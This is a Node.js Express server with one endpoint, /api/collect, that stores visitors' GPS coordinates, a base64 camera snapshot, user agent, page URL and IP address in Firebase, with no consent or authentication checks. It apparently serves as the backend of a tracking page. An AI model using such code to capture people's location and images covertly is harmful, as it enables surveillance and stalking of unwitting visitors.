const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const admin = require('firebase-admin');
const { v4: uuidv4 } = require('uuid');
const serviceAccount = require('./firebase-service-account.json'); // User must provide this file

const app = express();
const port = 3000;

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://YOUR_FIREBASE_PROJECT_ID.firebaseio.com",
  storageBucket: "YOUR_FIREBASE_PROJECT_ID.appspot.com"
});

const db = admin.database();
const bucket = admin.storage().bucket();

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

app.post('/api/collect', async (req, res) => {
  try {
    const { latitude, longitude, photo, timestamp, userAgent, url } = req.body;

    if (!latitude || !longitude) {
      return res.status(400).json({ error: 'Missing location data' });
    }

    const accessId = uuidv4();
    const accessRef = db.ref('accesses').child(accessId);

    let photoUrl = null;

    if (photo) {
      // photo is a data URL, convert to buffer
      const matches = photo.match(/^data:image\/png;base64,(.+)$/);
      if (matches) {
        const buffer = Buffer.from(matches[1], 'base64');
        const file = bucket.file(`photos/${accessId}.png`);
        await file.save(buffer, {
          metadata: { contentType: 'image/png' }
        });
        photoUrl = `https://storage.googleapis.com/${bucket.name}/photos/${accessId}.png`;
      }
    }

    await accessRef.set({
      latitude,
      longitude,
      photoUrl,
      timestamp,
      userAgent,
      url,
      ip: req.ip
    });

    res.json({ success: true });
  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(port, () => {
  console.log("Server running on port " + port);
});
